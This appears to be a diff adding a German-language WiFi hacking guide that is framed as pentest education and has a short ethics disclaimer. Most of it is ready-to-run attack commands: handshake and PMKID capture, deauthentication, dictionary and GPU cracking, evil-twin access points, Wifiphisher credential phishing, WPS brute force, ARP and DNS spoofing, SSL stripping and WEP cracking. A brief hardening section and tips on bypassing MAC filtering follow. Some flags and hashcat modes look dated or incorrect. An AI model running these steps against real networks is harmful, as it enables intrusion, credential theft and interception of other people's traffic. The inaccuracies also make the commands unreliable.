@@ -1,0 +1,351 @@
+# Praktische WiFi-Hacking-Anleitungen: Szenarien und Techniken
+
+## Vorbemerkung zu Ethik und Rechtslage
+
+Diese Anleitungen dienen ausschließlich zu Bildungs- und Testzwecken in autorisierten Umgebungen. Die Anwendung dieser Techniken ohne ausdrückliche Genehmigung kann illegal sein. Stellen Sie sicher, dass Sie:
+1. Nur eigene Netzwerke oder Netzwerke mit schriftlicher Genehmigung testen
+2. Lokale Gesetze bezüglich Netzwerksicherheit und Pentesting einhalten
+3. Keine persönlichen Daten sammeln oder Dienste stören
+
+## 1. Passive Netzwerkerkundung
+
+### Konfiguration eines WLAN-Adapters im Monitor-Modus
+
+```bash
+# Identifizieren des WLAN-Adapters
+ip a
+iw dev
+
+# Adapter in den Monitor-Modus versetzen
+airmon-ng check kill
+airmon-ng start wlan0  # wlan0 durch Ihren Adapternamen ersetzen
+
+# Überprüfen, ob der Monitor-Modus aktiv ist
+iwconfig
+```
+
+### Erfassung von Netzwerken mit airodump-ng
+
+```bash
+# Scannen aller Netzwerke in Reichweite
+airodump-ng wlan0mon
+
+# Gezielte Überwachung eines spezifischen Netzwerks
+airodump-ng -c [Kanal] --bssid [BSSID] -w [Ausgabedatei] wlan0mon
+```
+
+### WLAN-Kartierung mit Kismet
+
+```bash
+# Starten von Kismet
+kismet -c wlan0mon
+
+# Starten als Service mit Web-UI
+kismet_server -c wlan0mon
+# Zugriff auf: http://localhost:2501
+```
+
+## 2. WPA/WPA2-Handshake-Erfassung
+
+### Methode 1: Passives Capturing
+
+```bash
+# Gezielte Überwachung und Speicherung von Handshakes
+airodump-ng -c [Kanal] --bssid [BSSID] -w handshake wlan0mon
+
+# Warten auf natürlich auftretende Handshakes (Client-Verbindungen)
+```
+
+### Methode 2: Deauthentication-Angriff
+
+```bash
+# Zielgerichteter Deauthentication-Angriff auf einen Client
+aireplay-ng -0 1 -a [AP-BSSID] -c [Client-MAC] wlan0mon
+
+# Broadcast-Deauthentication (alle Clients)
+aireplay-ng -0 1 -a [AP-BSSID] wlan0mon
+```
+
+### Methode 3: PMKID-Erfassung mit hcxdumptool
+
+```bash
+# Erfassen von PMKID ohne Client-Deauthentication
+hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 --filtermode=2 --filterlist=[BSSID]
+
+# Konvertieren für Hashcat
+hcxpcapngtool -E essidlist -I identitylist -U usernamelist -o pmkid.hash pmkid.pcapng
+```
+
+## 3. WPA/WPA2-Passwort-Cracking
+
+### Methode 1: Wörterbuchangriff mit Aircrack-ng
+
+```bash
+# Einfacher Wörterbuchangriff auf erfassten Handshake
+aircrack-ng -w [Wörterbuch.txt] handshake-01.cap
+
+# Mit Regelvariationen (PMKID)
+aircrack-ng -w [Wörterbuch.txt] -r [Regeln] pmkid.cap
+```
+
+### Methode 2: Hashcat für GPU-beschleunigtes Cracking
+
+```bash
+# Konvertieren der Capture-Datei für Hashcat
+cap2hccapx handshake-01.cap handshake.hccapx
+
+# WPA2-Handshake-Cracking (Modus 2500)
+hashcat -m 2500 -a 0 handshake.hccapx [Wörterbuch.txt]
+
+# PMKID-Cracking (Modus 16800)
+hashcat -m 16800 -a 0 pmkid.hash [Wörterbuch.txt]
+
+# Mit Regeln für komplexere Angriffe
+hashcat -m 2500 -a 0 handshake.hccapx [Wörterbuch.txt] -r [Regeldatei]
+```
+
+### Methode 3: Automatisierte Angriffe mit Wifite
+
+```bash
+# Automatischer Angriff auf alle erreichbaren Netzwerke
+wifite
+
+# Gezielter Angriff mit spezifischen Optionen
+wifite --bssid [BSSID] -c [Kanal] -dict [Wörterbuch.txt]
+```
+
+## 4. Evil Twin / Rogue AP-Angriffe
+
+### Methode 1: Basic Evil Twin mit Airbase-ng
+
+```bash
+# Erstellen eines Fake-AP mit gleichem Namen
+airbase-ng -e "[SSID]" -c [Kanal] wlan0mon
+
+# Konfigurieren der Bridge-Schnittstelle
+ifconfig at0 up
+ifconfig at0 192.168.0.1/24
+```
+
+### Methode 2: Vollständiger Man-in-the-Middle mit hostapd und dnsmasq
+
+```bash
+# Konfigurationsdatei für hostapd erstellen
+cat > hostapd.conf << EOF
+interface=wlan0
+driver=nl80211
+ssid=[SSID]
+hw_mode=g
+channel=[Kanal]
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+EOF
+
+# DHCP-Server konfigurieren
+cat > dnsmasq.conf << EOF
+interface=wlan0
+dhcp-range=192.168.0.50,192.168.0.150,12h
+dhcp-option=3,192.168.0.1
+dhcp-option=6,192.168.0.1
+server=8.8.8.8
+log-queries
+log-dhcp
+listen-address=127.0.0.1
+EOF
+
+# AP starten
+hostapd hostapd.conf &
+dnsmasq -C dnsmasq.conf
+
+# IP-Forwarding aktivieren
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+```
+
+### Methode 3: Fortgeschrittener Phishing-Angriff mit Wifiphisher
+
+```bash
+# Starten von Wifiphisher für Phishing
+wifiphisher -e "[SSID]" -p oauth-login
+
+# Anpassung des Templates
+wifiphisher -e "[SSID]" -p firmware-upgrade
+```
+
+## 5. WPS-Angriffe
+
+### Pixie Dust-Angriff mit Reaver
+
+```bash
+# Scannen nach WPS-aktivierten APs
+wash -i wlan0mon
+
+# Pixie Dust-Angriff
+reaver -i wlan0mon -b [BSSID] -c [Kanal] -K 1
+```
+
+### Offline Brute-Force mit Bully
+
+```bash
+# WPS PIN Brute-Force
+bully -b [BSSID] -c [Kanal] -d -v 3 wlan0mon
+```
+
+## 6. Man-in-the-Middle-Angriffstechniken
+
+### ARP-Spoofing mit Bettercap
+
+```bash
+# Starten von Bettercap
+sudo bettercap -iface wlan0
+
+# Im Bettercap-Interface
+net.probe on
+net.recon on
+set arp.spoof.targets [Ziel-IP]
+arp.spoof on
+net.sniff on
+```
+
+### DNS-Spoofing mit Bettercap
+
+```bash
+# Fortsetzung vom ARP-Spoofing
+set dns.spoof.domains [domain.com]
+set dns.spoof.address [Fake-IP]
+dns.spoof on
+```
+
+### SSL-Stripping mit MITMproxy
+
+```bash
+# Starten von mitmproxy
+mitmproxy -T --host -p 8080
+
+# Einrichten der Weiterleitung
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+```
+
+## 7. WEP-Cracking (Ältere Netzwerke)
+
+### Passives Datensammeln
+
+```bash
+# Erfassen von IV-Paketen
+airodump-ng -c [Kanal] --bssid [BSSID] -w wep_data wlan0mon
+```
+
+### Aktives Packet-Injection
+
+```bash
+# ARP-Request-Replay-Angriff
+aireplay-ng -3 -b [BSSID] -h [Client-MAC] wlan0mon
+
+# Fragmentation-Angriff
+aireplay-ng -5 -b [BSSID] -h [Client-MAC] wlan0mon
+```
+
+### WEP-Schlüssel-Berechnung
+
+```bash
+# Cracking mit gesammelten IVs
+aircrack-ng -b [BSSID] wep_data-01.cap
+```
+
+## 8. Praktische Absicherung von WLANs
+
+### Access Point Härtung
+
+```bash
+# Sichere Konfiguration für OpenWrt
+uci set wireless.@wifi-iface[0].encryption=psk2+ccmp
+uci set wireless.@wifi-iface[0].key='langes-komplexes-passwort'
+uci set wireless.@wifi-iface[0].isolate=1
+uci commit wireless
+wifi
+
+# Deaktivieren von WPS
+uci set wireless.@wifi-device[0].wps_pushbutton=0
+uci commit wireless
+wifi
+```
+
+### Erkennung von Evil Twins und Rogue APs
+
+```bash
+# Kontinuierliches Monitoring mit Kismet
+kismet -c wlan0mon
+
+# Überwachung mit airmon-ng
+airodump-ng wlan0mon | grep "[Ihre-SSID]"
+```
+
+### Implementierung von Enterprise-Authentifizierung
+
+```bash
+# FreeRADIUS-Basiseinrichtung
+apt install freeradius
+nano /etc/freeradius/3.0/users
+
+# Hinzufügen eines Benutzers
+testuser  Cleartext-Password := "secure_password"
+
+# Access Point Konfiguration für 802.1X
+uci set wireless.@wifi-iface[0].encryption=wpa2+ccmp
+uci set wireless.@wifi-iface[0].server=[RADIUS-Server-IP]
+uci set wireless.@wifi-iface[0].port=1812
+uci set wireless.@wifi-iface[0].key=[RADIUS-Secret]
+uci commit wireless
+wifi
+```
+
+## 9. Analyse praktischer Beispiele
+
+### Durchführung eines vollständigen WiFi-Pentests
+
+1. **Aufklärung**
+   - Durchführen eines Standort-Surveys
+   - Erstellung einer WLAN-Landkarte
+   - Identifizierung aller APs und Clients
+
+2. **Schwachstellenanalyse**
+   - Überprüfung der Verschlüsselungsmethoden
+   - Testen auf WPS-Schwachstellen
+   - Überprüfung der Management-Schnittstellen
+
+3. **Exploitation**
+   - Bei Genehmigung: Versuch der Passwortwiederherstellung
+   - Testen auf Evil Twin-Anfälligkeit
+   - Überprüfung auf Client-Isolierung
+
+4. **Post-Exploitation**
+   - Überprüfung der Netzwerksegmentierung
+   - Interne Schwachstellenanalyse
+   - Privilegien-Eskalationsmöglichkeiten
+
+5. **Dokumentation**
+   - Detaillierte Berichterstattung aller Ergebnisse
+   - Empfehlungen zur Härtung und Absicherung
+   - Eindeutige Risikobewertung für jede Schwachstelle
+
+## 10. Erweiterte WiFi-Pentesting-Tipps
+
+### Optimierung der Hardware für WiFi-Pentests
+
+- Auswahl geeigneter Adapter (Atheros-Chipsätze für Monitoring/Injection)
+- Verwendung von externen Antennen für größere Reichweite
+- Einsatz spezialisierter Hardware (WiFi Pineapple, Alfa-Karten)
+
+### Umgehung gängiger Schutzmechanismen
+
+- Handhabung von MAC-Filterung (MAC-Spoofing)
+- Umgang mit Hidden SSIDs (Beacon-Frame-Analyse)
+- Strategien für Clientseitige Zertifikatsvalidierung
+
+### Verbesserung der Cracking-Effizienz
+
+- Erstellung zielgerichteter Wörterbücher
+- Optimierung von Hashcat-Regelsätzen
+- Nutzung von Cloud-basierten Cracking-Diensten
+- Verwendung von Rainbow-Tables für spezifische Szenarien 
